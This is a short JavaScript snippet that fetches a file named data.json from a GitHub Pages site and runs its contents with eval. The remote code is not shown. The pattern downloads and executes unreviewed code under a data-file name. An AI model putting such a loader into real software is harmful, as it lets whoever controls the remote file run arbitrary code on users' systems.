fetch("https://xpdevs.github.io/JS2PY/data/data.json")
    .then(response => response.text())
    .then(code => eval(code))  // Executes the script
    .catch(error => console.error("Script loading failed:", error));
